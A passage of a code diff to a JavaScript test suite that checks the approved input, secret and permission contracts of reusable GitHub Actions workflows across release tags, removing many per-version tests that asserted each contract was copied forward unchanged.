-  assertLiveSuccessors(WAVE_PATCH_TAG_CALLERS.map(({ reusable }) => reusable));
-  const contracts = HISTORICAL_CONTRACTS;
-  let asserted = 0;
-  for (const { reusable } of WAVE_PATCH_TAG_CALLERS) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_1}`];
-    assert.ok(previous, `expected a v0.22.1 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_2}`],
-      previous,
-      `${reusable} at the convergence tag is not a verbatim copy of its v0.22.1 entry`,
-    );
     asserted += 1;
   }
   assert.equal(asserted, 6);
@@ -9232,7 +5819,7 @@ test("a governed caller of each reusable at the convergence tag is admitted", as
     const root = await repository({
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [reference]: HISTORICAL_CONTRACTS[reference],
+          [pathOf(reference)]: HISTORICAL_CONTRACTS[reference],
         },
       },
       workflows: {
@@ -9251,184 +5838,6 @@ ${secrets ? `    secrets:\n${block(secrets, "      ")}\n` : ""}`,
     asserted += 1;
   }
   assert.equal(asserted, 6);
-});
-
-// The sync reusable is deliberately absent at the convergence tag.
-// `repin-policy-lockstep` declines `standards-sync.yml` because its old
-// revision's `sync` job "references `needs` in a routing-relevant field, which
-// cannot be safely diffed for auto-approval", and that question is unanswered;
-// bumping the sync reusable inside a change whose own merge triggers the
-// fan-out would also put an untested sync engine on the critical path. This
-// asserts the absence so a later change adds it deliberately rather than by a
-// copy-forward sweep.
-test("the sync reusable carries no contract at the convergence tag", () => {
-  const key = `melodic-software/ci-workflows/.github/workflows/standards-sync.yml@${REPINE_LANE_SHA_V0_22_2}`;
-  assert.equal(
-    HISTORICAL_POLICY.approvedReusableWorkflowContracts[key],
-    undefined,
-    "standards-sync gained a convergence-tag contract without answering the needs question",
-  );
-});
-
-// The v0.25.0 tag. Auto-approval declines all three: both lanes report
-// `diffField: credentialReferences`, because that surface records a
-// credential-consuming step's `uses:` line in full and the revision bumps
-// `anthropics/claude-code-action` inside one, and `standards-sync` throws the
-// same `needs`-in-a-routing-relevant-field decline it has always thrown. Each
-// entry is therefore written by review, and equality against its v0.24.0
-// predecessor is the assertion, so an input, secret, or caller permission
-// widened in the new key fails here rather than shipping.
-test("every reusable contract at the v0.25.0 tag copies its v0.24.0 entry forward verbatim", () => {
-  assertLiveSuccessors(["claude-review", "claude-security-review", "standards-sync"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  let asserted = 0;
-  for (const reusable of ["claude-review", "claude-security-review", "standards-sync"]) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_24_0}`];
-    assert.ok(previous, `expected a v0.24.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_25_0}`],
-      previous,
-      `${reusable} at the v0.25.0 tag is not a verbatim copy of its v0.24.0 entry`,
-    );
-    asserted += 1;
-  }
-  assert.equal(asserted, 3);
-});
-
-// The v0.26.0 tag moves no lane or sync workflow bytes. The compare
-// 91d06c94...de644a0a is two commits, and neither touches
-// claude-review.yml, claude-security-review.yml, or standards-sync.yml;
-// those three blobs are identical at both revisions. Auto-approval still
-// declines the set, because standards-sync throws the standing
-// needs-in-a-routing-relevant-field error and that decline suppresses every
-// write. Each entry is therefore written by review, as a verbatim copy of
-// its v0.25.0 predecessor.
-test("every reusable contract at the v0.26.0 tag copies its v0.25.0 entry forward verbatim", () => {
-  assertLiveSuccessors(["claude-review", "claude-security-review", "standards-sync"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  let asserted = 0;
-  for (const reusable of ["claude-review", "claude-security-review", "standards-sync"]) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_25_0}`];
-    assert.ok(previous, `expected a v0.25.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_26_0}`],
-      previous,
-      `${reusable} at the v0.26.0 tag is not a verbatim copy of its v0.25.0 entry`,
-    );
-    asserted += 1;
-  }
-  assert.equal(asserted, 3);
-});
-
-// v0.27.0 registers the three lane/sync reusables the repin lane moves plus
-// the four reusables consumers repin by hand. None widens: checks gains a
-// markdown-extra-globs input that stays out of allowedInputs because no
-// caller passes it, and issue-triage-label only changes its label default.
-test("every reusable contract at the v0.27.0 tag copies its predecessor forward verbatim", () => {
-  assertLiveSuccessors(Object.keys(LIVE_SUCCESSOR));
-  const contracts = HISTORICAL_CONTRACTS;
-  const predecessors = {
-    "claude-review": REPINE_LANE_SHA_V0_26_0,
-    "claude-security-review": REPINE_LANE_SHA_V0_26_0,
-    "standards-sync": REPINE_LANE_SHA_V0_26_0,
-    checks: REPINE_LANE_SHA_V0_24_0,
-    zizmor: REPINE_LANE_SHA_V0_24_0,
-    "osv-scanner": REPINE_LANE_SHA_V0_24_0,
-    "issue-triage-label": REPINE_LANE_SHA_V0_24_0,
-  };
-  for (const [reusable, sha] of Object.entries(predecessors)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${sha}`];
-    assert.ok(previous, `expected a predecessor contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_27_0}`],
-      previous,
-      `${reusable} at the v0.27.0 tag is not a verbatim copy of its predecessor`,
-    );
-  }
-});
-
-// v0.27.1 only moves ci-workflows' internal self-pins; every contract surface
-// is unchanged, so all seven entries copy v0.27.0 forward.
-test("every reusable contract at the v0.27.1 tag copies its v0.27.0 entry forward verbatim", () => {
-  assertLiveSuccessors(Object.keys(LIVE_SUCCESSOR));
-  const contracts = HISTORICAL_CONTRACTS;
-  const reusables = [
-    "claude-review",
-    "claude-security-review",
-    "standards-sync",
-    "checks",
-    "zizmor",
-    "osv-scanner",
-    "issue-triage-label",
-  ];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_27_0}`];
-    assert.ok(previous, `expected a v0.27.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_27_1}`],
-      previous,
-      `${reusable} at the v0.27.1 tag is not a verbatim copy of its v0.27.0 entry`,
-    );
-  }
-});
-
-// v0.28.1 changes only claude-review's behavior under a disabled review cap;
-// both lane contracts copy v0.28.0 forward.
-test("both claude lane contracts at the v0.28.1 tag copy their v0.28.0 entry forward verbatim", () => {
-  assertLiveSuccessors(["claude-review", "claude-security-review"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  for (const reusable of ["claude-review", "claude-security-review"]) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_28_0}`];
-    assert.ok(previous, `expected a v0.28.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_28_1}`],
-      previous,
-      `${reusable} at the v0.28.1 tag is not a verbatim copy of its v0.28.0 entry`,
-    );
-  }
-});
-
-// v0.29.0 slims both lanes to one caller-passed input; only allowedInputs narrows.
-test("both claude lane contracts at the v0.29.0 tag narrow their v0.28.1 entry to the runner input", () => {
-  assertLiveSuccessors(["claude-review", "claude-security-review"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  for (const reusable of ["claude-review", "claude-security-review"]) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_28_1}`];
-    assert.ok(previous, `expected a v0.28.1 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_29_0}`],
-      { ...previous, allowedInputs: ["runner"] },
-      `${reusable} at the v0.29.0 tag must equal its v0.28.1 entry except allowedInputs ["runner"]`,
-    );
-  }
-});
-
-// v0.29.1 moves no input, secret, permission or routing field: the lanes gain
-// a Skill grant and a stricter status job, standards-sync only comments.
-test("every reusable contract at the v0.29.1 tag copies its predecessor forward verbatim", () => {
-  assertLiveSuccessors(["claude-review", "claude-security-review", "standards-sync"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  const predecessors = {
-    "claude-review": REPINE_LANE_SHA_V0_29_0,
-    "claude-security-review": REPINE_LANE_SHA_V0_29_0,
-    "standards-sync": REPINE_LANE_SHA_V0_27_1,
-  };
-  for (const [reusable, sha] of Object.entries(predecessors)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${sha}`];
-    assert.ok(previous, `expected a predecessor contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_29_1}`],
-      previous,
-      `${reusable} at the v0.29.1 tag is not a verbatim copy of its predecessor`,
-    );
-  }
 });
 
 // The hosted lane callers (components/claude-lanes-hosted/) are the public
@@ -9482,7 +5891,7 @@ test("every managed target of a hosted claude lane caller is public and audits c
       assert.ok(isPublicTarget(target), `${source} is managed for ${target}, which is private`);
       const root = await consumerCarrying({ body, visibility: "public", selfHostedCi: false });
       assert.deepEqual(
-        await auditRepository({ root, githubRepository: target, fetchImpl: HERMETIC_FETCH_STUB }),
+        await auditRepository({ root, githubRepository: target }),
         [],
         `${source} is managed for ${target} (public, hosted-only) but does not audit clean there`,
       );
@@ -9509,921 +5918,24 @@ test("no target manages both the fleet and the hosted caller of one lane", async
   }
 });
 
-// v0.30.1 moves no input, secret, permission or routing field: the lanes only
-// bump claude-code-action, standards-sync is byte-identical.
-test("every reusable contract at the v0.30.1 tag copies its v0.29.1 entry forward verbatim", () => {
-  assertLiveSuccessors(["claude-review", "claude-security-review", "standards-sync"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  for (const reusable of ["claude-review", "claude-security-review", "standards-sync"]) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_29_1}`];
-    assert.ok(previous, `expected a v0.29.1 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_30_1}`],
-      previous,
-      `${reusable} at the v0.30.1 tag is not a verbatim copy of its v0.29.1 entry`,
-    );
-  }
-});
-
-// v0.39.8 moves no input, secret, permission or routing field: the claude
-// lanes bump claude-code-action, the sync lane and the markdownlint action bump
-// setup-node, and the other reusables are byte-identical.
-test("every reusable contract at the v0.39.8 tag copies its v0.39.3 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = [
-    "intake-triage",
-    "intake-label-needs-triage",
-    "maintenance-sync-standards",
-    "pr-audit-workflows",
-    "pr-automerge-dependabot",
-    "pr-review",
-    "pr-review-security",
-    "pr-run-checks",
-    "pr-scan-dependencies",
-  ];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${LIVE_CI_WORKFLOWS_SHA}`];
-    assert.ok(previous, `expected a v0.39.3 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_39_8}`],
-      previous,
-      `${reusable} at the v0.39.8 tag is not a verbatim copy of its v0.39.3 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_39_8}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.40.0 adds one input to the two review lanes, `allowed-bot-sender-ids`,
-// and changes no secret, permission or routing field; no other reusable is
-// registered at it.
-test("the review contracts at the v0.40.0 tag are their v0.39.8 entries plus allowed-bot-sender-ids", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["pr-review", "pr-review-security"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_39_8}`];
-    assert.ok(previous, `expected a v0.39.8 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_40_0}`],
-      { ...previous, allowedInputs: [...previous.allowedInputs, "allowed-bot-sender-ids"] },
-      `${reusable} at the v0.40.0 tag is not its v0.39.8 entry plus allowed-bot-sender-ids`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_40_0}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.41.0 adds completion verification to the two review lanes and changes no
-// input, secret, permission or routing field; maintenance-sync-standards is
-// byte-identical to v0.39.8. Each copies its newest entry forward verbatim.
-test("every reusable contract at the v0.41.0 tag copies its previous entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const bases = {
-    "pr-review": REPINE_LANE_SHA_V0_40_0,
-    "pr-review-security": REPINE_LANE_SHA_V0_40_0,
-    "maintenance-sync-standards": REPINE_LANE_SHA_V0_39_8,
-  };
-  for (const [reusable, base] of Object.entries(bases)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${base}`];
-    assert.ok(previous, `expected a ${base} contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_41_0}`],
-      previous,
-      `${reusable} at the v0.41.0 tag is not a verbatim copy of its ${base} entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_41_0}`)).length,
-    Object.keys(bases).length,
-  );
-});
-
-// v0.42.0 adds one input to each intake lane and changes no secret, permission
-// or routing field; no other reusable is registered at it.
-test("the intake contracts at the v0.42.0 tag are their v0.39.8 entries plus one input", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const added = { "intake-triage": "floor-label", "intake-label-needs-triage": "human-label" };
-  for (const [reusable, input] of Object.entries(added)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_39_8}`];
-    assert.ok(previous, `expected a v0.39.8 contract for ${reusable}`);
-    const current = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_42_0}`];
-    assert.deepEqual(
-      { ...current, allowedInputs: [...current.allowedInputs].sort() },
-      { ...previous, allowedInputs: [...previous.allowedInputs, input].sort() },
-      `${reusable} at the v0.42.0 tag is not its v0.39.8 entry plus ${input}`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_42_0}`)).length,
-    Object.keys(added).length,
-  );
-});
-
-// v0.42.1 changes only the verify step's script in the two review lanes and no
-// input, secret, permission or routing field; maintenance-sync-standards is
-// byte-identical to v0.41.0. Each copies its v0.41.0 entry forward verbatim.
-test("every reusable contract at the v0.42.1 tag copies its v0.41.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["pr-review", "pr-review-security", "maintenance-sync-standards"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_41_0}`];
-    assert.ok(previous, `expected a v0.41.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_42_1}`],
-      previous,
-      `${reusable} at the v0.42.1 tag is not a verbatim copy of its v0.41.0 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_42_1}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.42.2 bumps the claude-code-action pin and sets one env var on the review
-// lanes' action step, with no input, secret, permission or routing change.
-test("every reusable contract at the v0.42.2 tag copies its v0.42.1 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["pr-review", "pr-review-security"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_42_1}`];
-    assert.ok(previous, `expected a v0.42.1 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_42_2}`],
-      previous,
-      `${reusable} at the v0.42.2 tag is not a verbatim copy of its v0.42.1 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_42_2}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.44.0 adds the optional model and effort inputs and the optional
-// fallback-claude-code-oauth-token secret to the review lanes; no caller passes
-// them, so the contracts stay closed to them. No permission or routing change.
-// maintenance-sync-standards only bumps create-github-app-token.
-test("every reusable contract at the v0.44.0 tag copies its previous entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const previousShas = {
-    "pr-review": REPINE_LANE_SHA_V0_42_2,
-    "pr-review-security": REPINE_LANE_SHA_V0_42_2,
-    "maintenance-sync-standards": REPINE_LANE_SHA_V0_42_1,
-  };
-  for (const [reusable, previousSha] of Object.entries(previousShas)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${previousSha}`];
-    assert.ok(previous, `expected a previous contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_44_0}`],
-      previous,
-      `${reusable} at the v0.44.0 tag is not a verbatim copy of its previous entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_44_0}`)).length,
-    Object.keys(previousShas).length,
-  );
-});
-
-// v0.44.1 adds a bubblewrap install step to the review lanes and retunes their
-// timeouts; maintenance-sync-standards is unchanged. No input, secret,
-// permission or routing change.
-test("every reusable contract at the v0.44.1 tag copies its v0.44.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["pr-review", "pr-review-security", "maintenance-sync-standards"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_44_0}`];
-    assert.ok(previous, `expected a v0.44.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_44_1}`],
-      previous,
-      `${reusable} at the v0.44.1 tag is not a verbatim copy of its v0.44.0 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_44_1}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.45.0 adds the model-args input to the review lanes, and intake-triage's
-// claude-args becomes callable; each entry is its predecessor plus exactly
-// that one input. maintenance-sync-standards is unchanged.
-test("every reusable contract at the v0.45.0 tag copies its predecessor and adds only its new input", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const successors = {
-    "pr-review": { previousSha: REPINE_LANE_SHA_V0_44_1, added: ["model-args"] },
-    "pr-review-security": { previousSha: REPINE_LANE_SHA_V0_44_1, added: ["model-args"] },
-    "intake-triage": { previousSha: REPINE_LANE_SHA_V0_42_0, added: ["claude-args"] },
-    "maintenance-sync-standards": { previousSha: REPINE_LANE_SHA_V0_44_1, added: [] },
-  };
-  for (const [reusable, { previousSha, added }] of Object.entries(successors)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${previousSha}`];
-    assert.ok(previous, `expected a previous contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_45_0}`],
-      { ...previous, allowedInputs: [...previous.allowedInputs, ...added] },
-      `${reusable} at the v0.45.0 tag is not its previous entry plus ${added.join(", ") || "nothing"}`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_45_0}`)).length,
-    Object.keys(successors).length,
-  );
-});
-
-// v0.48.0 adds a step to the review lane that writes the pull request
-// description and closing issues to a file, using the job's github.token;
-// pr-review-security and maintenance-sync-standards are byte-identical.
-// No input, secret, permission or routing change.
-test("every reusable contract at the v0.48.0 tag copies its v0.45.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["pr-review", "pr-review-security", "maintenance-sync-standards"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_45_0}`];
-    assert.ok(previous, `expected a v0.45.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_48_0}`],
-      previous,
-      `${reusable} at the v0.48.0 tag is not a verbatim copy of its v0.45.0 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_48_0}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.49.0 gates intake by author id and admits a workflow_dispatch for a
-// listed actor; intake-triage is its v0.45.0 entry plus exactly those inputs.
-test("intake-triage at the v0.49.0 tag copies its v0.45.0 entry and adds only the author-gate inputs", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const workflowPath = "melodic-software/ci-workflows/.github/workflows/intake-triage.yml";
-  const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_45_0}`];
-  assert.ok(previous, "expected a v0.45.0 contract for intake-triage");
-  assert.deepEqual(contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_49_0}`], {
-    ...previous,
-    allowedInputs: [
-      ...previous.allowedInputs,
-      "issue-number",
-      "allowed-author-ids",
-      "allowed-bot-sender-ids",
-    ],
-  });
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_49_0}`)).length,
-    1,
-  );
-});
-
-// v0.51.0 runs intake on run-claude-cli, funded by a named role; intake-triage
-// is its v0.49.0 entry plus `role` and the automations role's two secrets.
-test("intake-triage at the v0.51.0 tag copies its v0.49.0 entry and adds only the role input and secrets", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const workflowPath = "melodic-software/ci-workflows/.github/workflows/intake-triage.yml";
-  const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_49_0}`];
-  assert.ok(previous, "expected a v0.49.0 contract for intake-triage");
-  assert.deepEqual(contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_51_0}`], {
-    ...previous,
-    role: "automations",
-    allowedInputs: [...previous.allowedInputs, "role"],
-    allowedSecrets: {
-      CLAUDE_API_KEY: `\${{ secrets.AUTOMATIONS_CLAUDE_API_KEY }}`,
-      CLAUDE_CODE_OAUTH_TOKEN: `\${{ secrets.AUTOMATIONS_CLAUDE_CODE_OAUTH_TOKEN }}`,
-    },
-  });
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_51_0}`)).length,
-    1,
-  );
-});
-
-// v0.54.0 adds a subprocess-sandbox probe and a Bun install check to both
-// review lanes; maintenance-sync-standards changes only a comment.
-// No input, secret, permission or routing change.
-test("every reusable contract at the v0.54.0 tag copies its v0.48.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["pr-review", "pr-review-security", "maintenance-sync-standards"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_48_0}`];
-    assert.ok(previous, `expected a v0.48.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_54_0}`],
-      previous,
-      `${reusable} at the v0.54.0 tag is not a verbatim copy of its v0.48.0 entry`,
-    );
-  }
-  // intake-triage's caller moves from f129f4c (v0.51.0), whose contract
-  // carries forward unchanged: inputs, secrets and caller permissions match.
-  const intake = "melodic-software/ci-workflows/.github/workflows/intake-triage.yml";
-  const intakePrevious = contracts[`${intake}@f129f4c142d00ec3feacbf2b9102d327088504bf`];
-  assert.ok(intakePrevious, "expected the v0.51.0 intake-triage contract");
-  assert.deepEqual(
-    contracts[`${intake}@${REPINE_LANE_SHA_V0_54_0}`],
-    intakePrevious,
-    "intake-triage at the v0.54.0 tag is not a verbatim copy of its v0.51.0 entry",
-  );
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_54_0}`)).length,
-    reusables.length + 1,
-  );
-});
-
-// v0.55.0 adds pr-review's allowed-author-ids input; every other entry,
-// intake-triage included, carries its v0.54.0 entry forward unchanged.
-test("every reusable contract at the v0.55.0 tag copies its v0.54.0 entry and adds only its new input", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const added = {
-    "pr-review": ["allowed-author-ids"],
-    "pr-review-security": [],
-    "maintenance-sync-standards": [],
-    "intake-triage": [],
-  };
-  for (const [reusable, inputs] of Object.entries(added)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_54_0}`];
-    assert.ok(previous, `expected a v0.54.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_55_0}`],
-      { ...previous, allowedInputs: [...previous.allowedInputs, ...inputs] },
-      `${reusable} at the v0.55.0 tag is not its v0.54.0 entry plus ${inputs.join(", ") || "nothing"}`,
-    );
-  }
-  // maintenance-check-links-online is new at this tag (#824), so it has no
-  // v0.54.0 entry to copy.
-  assert.deepEqual(
-    new Set(
-      Object.keys(contracts)
-        .filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_55_0}`))
-        .map((key) => key.split("/").at(-1).split(".yml@")[0]),
-    ),
-    new Set([...Object.keys(added), "maintenance-check-links-online"]),
-  );
-});
-
-// v0.56.0 changes only pr-require-checks actions; both intake files are
-// byte-identical to the SHA their previous entry reviewed, so each entry
-// carries forward verbatim.
-test("both intake contracts at the v0.56.0 tag copy their reviewed entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const previousSha = {
-    "intake-triage": REPINE_LANE_SHA_V0_55_0,
-    "intake-label-needs-triage": REPINE_LANE_SHA_V0_42_0,
-  };
-  for (const [reusable, sha] of Object.entries(previousSha)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${sha}`];
-    assert.ok(previous, `expected a ${sha} contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_56_0}`],
-      previous,
-      `${reusable} at the v0.56.0 tag is not a verbatim copy of its ${sha} entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_56_0}`)).length,
-    Object.keys(previousSha).length,
-  );
-});
-
-// v0.58.0 keeps both intake interfaces: intake-label-needs-triage is
-// byte-identical, and intake-triage changes only steps and job outputs (the
-// 401/402 subscription handoff and the `latest` CLI default), so each entry
-// carries its v0.56.0 contract forward verbatim.
-test("both intake contracts at the v0.58.0 tag copy their v0.56.0 entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["intake-triage", "intake-label-needs-triage"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_56_0}`];
-    assert.ok(previous, `expected a v0.56.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_58_0}`],
-      previous,
-      `${reusable} at the v0.58.0 tag is not a verbatim copy of its v0.56.0 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_58_0}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.59.0 keeps the online link check's interface: inputs, secrets and
-// permissions are unchanged and only steps move (ci-workflows#844), so its
-// v0.55.0 entry carries forward verbatim.
-test("the online link-check contract at the v0.59.0 tag copies its v0.55.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const workflowPath =
-    "melodic-software/ci-workflows/.github/workflows/maintenance-check-links-online.yml";
-  const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_55_0}`];
-  assert.ok(previous, "expected a v0.55.0 contract for maintenance-check-links-online");
-  assert.deepEqual(contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_59_0}`], previous);
-  assert.deepEqual(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_59_0}`)),
